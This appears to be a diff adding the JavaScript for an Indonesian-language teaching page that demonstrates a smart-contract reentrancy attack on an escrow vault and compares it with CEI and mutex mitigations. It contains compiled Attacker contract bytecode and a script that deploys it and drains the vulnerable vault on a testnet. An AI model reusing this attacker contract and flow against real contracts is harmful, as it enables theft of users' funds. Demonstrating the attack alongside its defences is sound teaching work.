+  document.querySelectorAll('.step').forEach(s => { s.className = 'step'; });
+  document.querySelectorAll('.step .sr').forEach(s => { s.style.display = 'none'; s.innerHTML = ''; });
+  document.querySelectorAll('.step .sa .btn').forEach(b => { b.disabled = (b.id !== 'b0'); });
+  document.getElementById('reentryArea').classList.add('h');
+  
+  // Update tabs
+  document.querySelectorAll('.mode-tab').forEach(t => t.classList.remove('active'));
+  document.querySelector(`.mode-tab[data-mode="${mode}"]`).classList.add('active');
+  
+  // Update UI elements
+  const c = CONTRACTS[mode];
+  const isR = mode === 'insecure';
+  
+  // Mode info banner
+  const mi = document.getElementById('modeInfo');
+  mi.className = `mode-info mi-${c.color}`;
+  const icons = { insecure:'🔴', secure:'🟢', mutex:'🟡' };
+  document.getElementById('modeInfoTitle').textContent = `Mode: ${c.name} — ${isR ? 'Rentan terhadap Reentrancy' : mode === 'secure' ? 'Aman dengan pola CEI' : 'Aman dengan Mutex Lock'}`;
+  document.getElementById('modeInfoDesc').innerHTML = isR
+    ? 'Kontrak asli tanpa mitigasi. Fungsi <code>withdrawFunds()</code> transfer ETH SEBELUM reset saldo — melanggar CEI.'
+    : mode === 'secure'
+    ? 'Menerapkan pola CEI: saldo direset DULU sebelum transfer. Reentrancy gagal karena saldo sudah 0 saat receive() dipanggil.'
+    : 'Menggunakan ReentrancyGuard (mutex lock) dari OpenZeppelin. Reentrancy diblokir di level mekanisme locking.';
+  document.querySelector('.mi-icon').textContent = icons[mode];
+  
+  // Bar color
+  document.getElementById('modeBar').className = `bar ${c.color}`;
+  
+  // Badges
+  document.getElementById('s0badge').textContent = `${c.label}`;
+  document.getElementById('s0badge').className = `mode-badge ${c.color}`;
+  document.getElementById('s1badge').textContent = `${c.label}`;
+  document.getElementById('s1badge').className = `mode-badge ${c.color}`;
+  document.getElementById('s2badge').textContent = `${c.label}`;
+  document.getElementById('s2badge').className = `mode-badge ${c.color}`;
+  
+  // Addresses
+  document.getElementById('inputVault').value = c.vaultAddr;
+  document.getElementById('inputAttacker').value = c.attAddr;
+  vaultAddr = c.vaultAddr;
+  attAddr = c.attAddr;
+  document.getElementById('modeAddrHint').textContent = `${c.label} Mode`;
+  
+  // Code viewer
+  document.getElementById('codeBody').innerHTML = c.code;
+  document.getElementById('codeFile').textContent = `📁 ${c.name}.sol`;
+  updateCodeStatus('⏸️ Pilih mode, deploy, lalu jalankan step');
+  
+  // Flow diagram
+  resetFlow();
+  
+  // Explanation
+  updateExplain('💡 Mode berubah', 'Pilih mode di atas, deploy kontrak, lalu jalankan step 1-3 untuk melihat perbedaan.', '');
+  
+  // Labels
+  document.getElementById('vaultLabel').textContent = `🏪 ${c.name}`;
+  document.getElementById('afterLb').textContent = isR ? '💀 Escrow Sesudah' : '🛡️ Escrow Sesudah';
+  
+  log(`Mode: ${c.label} — ${c.name}`, isR ? 'wa' : 'ok');
+  
+  // Reset analytics
+  resetAnalytics();
+}
+
+// ===== ANALYTICS HELPERS =====
+function trackGas(label, gas){totalGasUsed+=gas;gasLog.push({label,gas});document.getElementById('gasSummary').textContent=`| Total gas: ${totalGasUsed.toString()}`}
+function updateCodeStatus(t){document.getElementById('codeStatus').textContent=t}
+function resetFlow(){['fw','fa','fv'].forEach(i=>document.getElementById(i).className='fb');['fc1','fc2'].forEach(i=>document.getElementById(i).className='fc');document.getElementById('flowLoop').className='fl h';document.getElementById('flowLoopCount').textContent='0×';updateFlowStatus('⏸️ Menunggu...')}
+function updateFlowStatus(t){document.getElementById('flowStatus').textContent=t}
+function updateFlowLoop(c){document.getElementById('flowLoop').className='fl';document.getElementById('flowLoop').classList.add('active');document.getElementById('flowLoopCount').textContent=c+'×'}
+function updateExplain(t,b,ty){const bx=document.getElementById('explainBox');bx.className='eb'+(ty?' step-'+ty:'');document.getElementById('explainTitle').textContent=t;document.getElementById('explainBody').innerHTML=b}
+function resetAnalytics(){gasLog=[];totalGasUsed=0n;document.getElementById('gasSummary').textContent='';resetFlow()}
+
+// ===== LOAD CONTRACTS =====
+async function loadContracts(){if(!signer){log('Connect Wallet dulu!','er');return}
+vaultAddr=document.getElementById('inputVault').value.trim();attAddr=document.getElementById('inputAttacker').value.trim()
+if(!ethers.isAddress(vaultAddr)||!ethers.isAddress(attAddr)){log('Alamat kontrak tidak valid!','er');return}
+try{vault=new ethers.Contract(vaultAddr,VAULT_ABI,signer);attacker=new ethers.Contract(attAddr,ATTACKER_ABI,signer);await vault.getContractBalance();await attacker.getAttackerBalance()}catch(e){log(`Gagal baca kontrak: ${e.message}`,'er');return}
+document.getElementById('vaultAddr').textContent=vaultAddr;document.getElementById('attAddr').textContent=attAddr;document.getElementById('btnLoad').textContent='✅ Loaded';log('Contracts loaded ✅','ok');await refreshUI()}
+
+// ===== DEPLOY =====
+async function deployContracts(){const btn=document.getElementById('btnDeploy');if(!signer){log('Connect Wallet dulu!','er');return}
+btn.disabled=true;btn.textContent='⏳ Deploying...';const bKey=currentMode;const c=CONTRACTS[bKey]
+try{const vf=new ethers.ContractFactory(VAULT_ABI,c.bytecode.vault,signer);log(`⏳ Deploying ${c.name}...`,'info');const vc=await vf.deploy();await vc.waitForDeployment();const va=await vc.getAddress();log(`✅ ${c.name}: ${va}`,'ok');document.getElementById('inputVault').value=va
+btn.textContent='⏳ Attacker...';const af=new ethers.ContractFactory(ATTACKER_ABI,'0x60c060405234801561001057600080fd5b5060405161095738038061095783398101604081905261002f9161009e565b6001600160a01b0381166100895760405162461bcd60e51b815260206004820181905260248201527f41747461636b65723a20696e76616c6964207461726765742061646472657373604482015260640160405180910390fd5b6001600160a01b03166080523360a0526100ce565b6000602082840312156100b057600080fd5b81516001600160a01b03811681146100c757600080fd5b9392505050565b60805160a0516108266101316000396000818161026601528181610307015281816103da01526104b4015260008181609c01528181610173015281816102da0152818161054a0152818161062601528181610671015261070401526108266000f3fe60806040526004361061007f5760003560e01c80638da5cb5b1161004e5780638da5cb5b146102545780639e5faafc146102a0578063a8e30e2c146102b5578063d4b83992146102c857600080fd5b80635b980628146101ec57806364c856591461020157806365a7463c14610229578063857c7cf11461023e57600080fd5b366101e757600080549080610093836107b0565b919050555060007f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316636f9fb98a6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100f8573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061011c91906107d7565b90506000547f797bdde34dd5b4feeead52035867a35f2cc2124441160559d154aef35b4f9f058260405161015291815260200190565b60405180910390a260008111801561016c5750601e600054105b156101e5577f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03166324600fc36040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101cc57600080fd5b505af11580156101e0573d6000803e3d6000fd5b505050505b005b600080fd5b3480156101f857600080fd5b506101e56102fc565b34801561020d57600080fd5b50610216601e81565b6040519081526020015b60405180910390f35b34801561023557600080fd5b50600054610216565b34801561024a57600080fd5b5061021660005481565b34801561026057600080fd5b506102887f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b039091168152602001610220565b3480156102ac57600080fd5b506101e56104a9565b3480156102c157600080fd5b5047610216565b3480156102d457600080fd5b506102887f000000000000000000000000000000000000000000000000000000000000000081565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146103885760405162461bcd60e51b815260206004820152602660248201527f41747461636b65723a206f6e6c79206f776e65722063616e20636f6c6c6563746044820152652066756e647360d01b60648201526084015b60405180910390fd5b47806103d65760405162461bcd60e51b815260206004820152601c60248201527f41747461636b65723a206e6f7468696e6720746f20636f6c6c65637400000000604482015260640161037f565b60007f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03168260405160006040518083038185875af1925050503d8060008114610443576040519150601f19603f3d011682016040523d82523d6000602084013e610448565b606091505b50509050806104a55760405162461bcd60e51b8152602060048201526024808201527f41747461636b65723a20636f6c6c656374696f6e207472616e736665722066616044820152631a5b195960e21b606482015260840161037f565b5050565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146105325760405162461bcd60e51b815260206004820152602860248201527f41747461636b65723a206f6e6c79206f776e65722063616e20696e6974696174604482015267652061747461636b60c01b606482015260840161037f565b60405163f8b2cb4f60e01b81523060048201526000907f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03169063f8b2cb4f90602401602060405180830381865afa158015610599573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105bd91906107d7565b1161061d5760405162461bcd60e51b815260206004820152602a60248201527f41747461636b65723a206e6f2062616c616e636520696e2074617267657420746044820152696f20776974686472617760b01b606482015260840161037f565b600080819055507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03167feb166e1e8ef8b9ce1d57e1def4a937161cd072453498bd7dc3335749719e628f7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316636f9fb98a6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156106cd573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106f191906107d7565b60405190815260200160405180910390a27f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03166324600fc36040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561075d57600080fd5b505af1158015610771573d6000803e3d6000fd5b505050507f4ef6191345aae76824ed25ff5065e33a8fbbb5a05823ebba2291fc6237a925f9476040516107a691815260200190565b60405180910390a1565b6000600182016107d057634e487b7160e01b600052601160045260246000fd5b5060010190565b6000602082840312156107e957600080fd5b505191905056fea264697066735822122017f4a29a10d3059de8abea2fe3213660f075e00370fde4a347dd834219b1f30c64736f6c634300081c0033',signer);const ac=await af.deploy(va);await ac.waitForDeployment();const aa=await ac.getAddress();log(`✅ Attacker: ${aa}`,'ok');document.getElementById('inputAttacker').value=aa
+btn.textContent='✅ Deployed!';log(`🚀 ${c.name} + Attacker deployed!`,'sp');await loadContracts()}catch(e){log(`Deploy error: ${e.message||e}`,'er');console.error(e);btn.disabled=false;btn.textContent='🚀 Deploy'}}
+
+// ===== REFRESH UI =====
+async function refreshUI(){if(!vault||!attacker)return;try{const vb=await vault.getContractBalance();const ab=await attacker.getAttackerBalance();document.getElementById('vaultBal').textContent=ethers.formatEther(vb);document.getElementById('attBal').textContent=ethers.formatEther(ab);const maxAmt=currentMode==='insecure'?'2.4':'0.024';const maxV=Number(ethers.parseEther(maxAmt));const pct=vb===0n?0:Math.min(90,Number(vb)/maxV*90);document.getElementById('vaultFill').style.height=pct+'%';if(vb===0n){document.getElementById('vaultBox').className='vb vb-drained';document.getElementById('vaultLock').textContent='💀'}else{document.getElementById('vaultBox').className='vb vb-safe';document.getElementById('vaultLock').textContent='🔒'}
+const ap=ab===0n?0:Math.min(90,Number(ab)/maxV*90);document.getElementById('attFill').style.height=ap+'%'}catch(e){}}
+
+function showDeployGuide(){log('📋 Deploy manual: npm run deploy:testnet','sp')}
+
+// ===== STEP 1 =====
+async function stepSetup(){const btn=document.getElementById('b0');btn.disabled=true;btn.textContent='⏳ Processing...';const seller=ethers.Wallet.createRandom().address;log(`Seller: ${seller}`,'info');resetAnalytics();const c=CONTRACTS[currentMode],isFull=(currentMode==='insecure');const amtA=isFull?'1.5':'0.015';const amtB=isFull?'0.8':'0.008';const amtAtt=isFull?'0.1':'0.001';const totalLabel=isFull?'2.4 ETH (demo penuh)':'0.024 ETH (demo ringan)';const ex=c.getExplanations('setup');updateExplain(ex.title,ex.body,'sd')
+try{let nid=Number(await vault.orderCount());log(`🔍 orderCount=${nid}, 3 order...`,'info');let tx,r,id;['charFA','charFB'].forEach(i=>document.getElementById(i).classList.add('depositing'))
+id=nid;tx=await vault.createOrder(seller);r=await tx.wait();trackGas('create A',r.gasUsed);log(`📦 Order A (ID ${id}) — Pembeli A deposit ${amtA} ETH`,'ok')
+tx=await vault.depositFunds(id,{value:ethers.parseEther(amtA)});r=await tx.wait();trackGas('deposit A',r.gasUsed);log(`💸 Pembeli A deposit ${amtA} ETH → Order ${id}`,'ok')
+tx=await vault.confirmDelivery(id);r=await tx.wait();trackGas('confirm A',r.gasUsed);log(`✅ Confirm delivery ${id}`,'ok');document.getElementById('charFAAmt').textContent='✅ '+amtA+' ETH';document.getElementById('charFA').classList.remove('depositing')
+id=nid+1;tx=await vault.createOrder(seller);r=await tx.wait();trackGas('create B',r.gasUsed);log(`📦 Order B (ID ${id}) — Pembeli B deposit ${amtB} ETH`,'ok')
+tx=await vault.depositFunds(id,{value:ethers.parseEther(amtB)});r=await tx.wait();trackGas('deposit B',r.gasUsed);log(`💸 Pembeli B deposit ${amtB} ETH → Order ${id}`,'ok')
+tx=await vault.confirmDelivery(id);r=await tx.wait();trackGas('confirm B',r.gasUsed);log(`✅ Confirm delivery ${id}`,'ok');document.getElementById('charFBAmt').textContent='✅ '+amtB+' ETH';document.getElementById('charFB').classList.remove('depositing')
+id=nid+2;tx=await vault.createOrder(attAddr);r=await tx.wait();trackGas('create Att',r.gasUsed);log(`📦 Order Penyerang (ID ${id}) — deposit ${amtAtt} ETH`,'wa')
+tx=await vault.depositFunds(id,{value:ethers.parseEther(amtAtt)});r=await tx.wait();trackGas('deposit Att',r.gasUsed);log(`💸 Penyerang deposit ${amtAtt} ETH → Order ${id}`,'wa')
+tx=await vault.confirmDelivery(id);r=await tx.wait();trackGas('confirm Att',r.gasUsed);log(`✅ Confirm delivery ${id}`,'ok');document.getElementById('charAttAmt').textContent='🎯 '+amtAtt+' ETH'
+document.getElementById('s0').classList.add('done');const vb=ethers.formatEther(await vault.getContractBalance());const totalEth=isFull?'2.4':'0.024';const honeypotEth=isFull?'2.3':'0.023';document.getElementById('r0').innerHTML=`<div style="color:#22c55e">✅ ${isFull?'Honeypot':'Setup'} siap!</div><div>🏪 Escrow: <strong>${vb} ETH</strong></div><div style="color:#888;font-size:10px;margin-top:2px">💰 Pembeli A: ${amtA} ETH | Pembeli B: ${amtB} ETH | 👾 Penyerang: ${amtAtt} ETH</div><div style="color:#f59e0b;font-size:10px;margin-top:2px">🎯 Total escrow: ${totalEth} ${isFull?'— target serangan reentrancy!':'(mode ringan — buktikan konsep)'}</div><div style="font-size:10px;color:#888;margin-top:2px">⛽ Gas: ${totalGasUsed.toString()}</div>`;document.getElementById('b1').disabled=false;document.getElementById('b1').classList.add('btn-glow');btn.textContent='✅ Done';log(`=== SETUP ${c.label} ✅ (gas: ${totalGasUsed}) ===`,'ok');await refreshUI()}catch(e){log(`Setup error: ${e.message}`,'er');btn.disabled=false;btn.textContent='▶️ Jalankan Step 1'}}
+
+// ===== STEP 2 =====
+async function stepAttack(){const btn=document.getElementById('b1'),isInsecure=(currentMode==='insecure'),isFull=(currentMode==='insecure');btn.disabled=true;btn.textContent='⚡ Submitting...';btn.classList.remove('btn-glow')
+updateCodeStatus(isInsecure?'🔴 EKSPLOITASI berlangsung — baris #5 transfer 0.1 ETH berulang!':'🛡️ CEI mengamankan — saldo direset duluan!')
+const c=CONTRACTS[currentMode]
+if(isInsecure){document.getElementById('charAtt').classList.add('draining');document.getElementById('charVault').classList.add('draining')}
+document.getElementById('fw').className='fb act';document.getElementById('fc1').className='fc act';document.getElementById('fa').className='fb dng';document.getElementById('fc2').className='fc act';document.getElementById('fv').className='fb dng'
+updateFlowStatus(isInsecure?'⚡ Serangan berlangsung...':'🛡️ CEI memblokir...')
+try{const bv=await vault.getContractBalance();document.getElementById('beforeVal').textContent=ethers.formatEther(bv);log(`🏪 Escrow sebelum: ${ethers.formatEther(bv)} ETH`,'wa')
+const tx=await attacker.attack();log('⏳ Menunggu konfirmasi...','info');const rcpt=await tx.wait();trackGas('attack()',rcpt.gasUsed);log(`✅ Transaksi sukses | gas: ${rcpt.gasUsed}`,'ok')
+const count=await attacker.getReentrancyCount();const maxR=await attacker.MAX_REENTRIES()
+if(isInsecure){document.getElementById('charAtt').classList.remove('draining');document.getElementById('charVault').classList.remove('draining')}
+document.getElementById('reentryArea').classList.remove('h');const bar=document.getElementById('reentryBar');bar.innerHTML='';const drainFill=document.getElementById('drainFill');const rsCount=document.getElementById('rsCountVal');const rsDrained=document.getElementById('rsDrainedVal');const rsStatus=document.getElementById('rsStatusVal');const perPull=isInsecure?ethers.parseEther(isFull?'0.1':'0.001'):0n;const totalDrained=perPull*BigInt(count);rsStatus.textContent='⚡ DRAINING...';const stepAmt=isFull?'0.1':'0.001';for(let i=0;i<Number(count);i++){const dot=document.createElement('div');dot.className='rdot f';dot.title='Loop '+(i+1);dot.style.animationDelay=(i*0.015)+'s';bar.appendChild(dot);setTimeout(()=>{rsCount.textContent=(i+1);const pct=Math.min(100,((i+1)/Number(count))*100);drainFill.style.width=pct+'%';const d=perPull*BigInt(i+1);rsDrained.textContent=ethers.formatEther(d)+' ETH';if(i+1===Number(count)){rsStatus.textContent='✅ DRAINED!';document.getElementById('rsCount').classList.add('ok');document.getElementById('rsDrained').classList.add('ok');document.getElementById('reentrySummary').innerHTML=`🔥 <strong>${count}× reentrancy</strong> — @ ${stepAmt} ETH/loop = <strong>${ethers.formatEther(totalDrained)} ETH</strong> terkuras!`}},i*25)}
+updateFlowLoop(Number(count));updateFlowStatus(isInsecure?`✅ Serangan berhasil! ${count}× loop`:`🛡️ CEI blokir! ${count}× percobaan gagal`)
+document.getElementById('s1').classList.add(isInsecure?'done':'fail');document.getElementById('b2').disabled=false;btn.textContent=isInsecure?'✅ Executed':'✅ Diblokir!'
+await refreshUI();const av=await vault.getContractBalance();document.getElementById('afterVal').textContent=ethers.formatEther(av);const profit=bv-av;document.getElementById('profitVal').textContent=ethers.formatEther(profit);document.getElementById('charVaultAmt').textContent=isInsecure?'💀 0 ETH':ethers.formatEther(av)
+const ex=c.getExplanations('attack');updateExplain(ex.title,ex.body,isInsecure?'sd':'sf')
+updateCodeStatus(isInsecure?'✅ Eksploitasi berhasil — dana terkuras!':'✅ CEI berhasil memblokir reentrancy!')
+document.getElementById('r1').innerHTML=(isInsecure?`<div style="color:#ef4444;font-weight:700">🔥 DANA TERKURAS! ${count}× reentrancy loop!</div>`:`<div style="color:#22c55e;font-weight:700">🛡️ CEI BLOKIR! ${count}× percobaan gagal!</div>`)+`<div style="font-size:10px;color:#888;margin-top:2px">⛽ Gas attack: ${totalGasUsed.toString()}</div>`
+if(av===0n){document.getElementById('afterVal').innerHTML='0.0 💀';log('🔥 2.4 ETH TERKURAS! Penyerang: modal 0.1 ETH + curian 2.3 ETH = 2.4 ETH','sp')}}catch(e){if(isInsecure){document.getElementById('charAtt').classList.remove('draining');document.getElementById('charVault').classList.remove('draining')}
+if(e.message&&e.message.toLowerCase().includes('reverted')){const isCei=currentMode!=='insecure';log(isCei?'✅ CEI/Mutex berhasil blokir reentrancy!':'❌ Attack REVERTED (mungkin kontrak bukan InsecureVault)','ok')
+document.getElementById('s1').classList.add(isCei?'done':'fail')
+if(isCei){document.getElementById('r1').innerHTML=`<div style="color:#22c55e;font-weight:700">🛡️ CEI/Mutex berhasil memblokir serangan!</div><div style="font-size:10px;color:#888;margin-top:2px">Saldo sudah 0 saat receive() mencoba panggil withdrawFunds() lagi.</div>`
+updateExplain('✅ CEI/Mutex Berhasil!','<strong style="color:#22c55e">Serangan reentrancy berhasil diblokir!</strong><br><br>Karena saldo sudah direset SEBELUM transfer ETH (CEI) atau mutex lock mengunci fungsi (Mutex), panggilan <code>withdrawFunds()</code> kedua gagal dan transaksi <strong>revert</strong>.<br><br>💡 Ini membuktikan bahwa pola <strong>CEI</strong> dan <strong>Mutex Lock</strong> efektif memitigasi reentrancy.','sd')
+updateCodeStatus('✅ CEI/Mutex berhasil memblokir!');updateFlowStatus('🛡️ Diblokir!')}else{document.getElementById('r1').innerHTML=`❌ Transaksi revert.<br><span style="font-size:10px;color:#888">Mungkin kontrak bukan InsecureVault?</span>`}}else{log(`Error: ${e.message}`,'er')}
+btn.disabled=false;btn.textContent=isInsecure?'⚡ Jalankan Serangan':'⚡ Coba Serang (pasti gagal)'}}
+
+// ===== STEP 3 =====
+async function stepCollect(){const btn=document.getElementById('b2'),isInsecure=(currentMode==='insecure');btn.disabled=true;btn.textContent='⏳...';btn.classList.remove('btn-glow')
+const c=CONTRACTS[currentMode];const ex=c.getExplanations('collect');updateExplain(ex.title,ex.body,'sd')
+try{const ab=await attacker.getAttackerBalance();log(`👾 Kontrak: ${ethers.formatEther(ab)} ETH`,'wa')
+if(isInsecure){const tx=await attacker.collectFunds();const rcpt=await tx.wait();trackGas('collect()',rcpt.gasUsed);log(`💰 Collected! gas: ${rcpt.gasUsed}`,'ok')}
+const profit=ethers.formatEther(ab);document.getElementById('s2').classList.add(isInsecure?'done':'done')
+document.getElementById('r2').innerHTML=isInsecure?`<div style="color:#f59e0b;font-weight:700">💰 ${profit} ETH — illegal profit!</div><div style="font-size:10px;color:#888;margin-top:2px">Bukti celah reentrancy menguras seluruh dana escrow.</div><div style="font-size:10px;color:#888">⛽ Total gas: ${totalGasUsed.toString()}</div>`:`<div style="color:#22c55e;font-weight:700">🛡️ Dana aman! Tidak ada illegal profit.</div><div style="font-size:10px;color:#888;margin-top:2px">CEI/Mutex berhasil melindungi ${profit} ETH milik petani.</div><div style="font-size:10px;color:#888">⛽ Total gas: ${totalGasUsed.toString()}</div>`
+btn.textContent=isInsecure?'✅ Collected':'✅ Aman';document.getElementById('profitVal').textContent=isInsecure?profit:'0.0';document.getElementById('charYouAmt').textContent=isInsecure?`💰 +${profit} ETH`:'🛡️ Aman'
+log(isInsecure?`💰 Illegal profit: ${profit} ETH — simulasi berhasil!`:`🛡️ Dana aman — CEI/Mutex bekerja!`,'sp');log(`=== ${isInsecure?'EKSPLOITASI BERHASIL':'MITIGASI BERHASIL'} — ${c.label} ===`,'sp');await refreshUI()}catch(e){log(`Error: ${e.message}`,'er');btn.disabled=false;btn.textContent='💰 Lihat Hasil'}}
+
+// Auto refresh
+setInterval(()=>{if(vault&&attacker&&signer)refreshUI()},4000);
+
+// Initialize
+switchMode('insecure');
+</script>
+</body>
+</html>
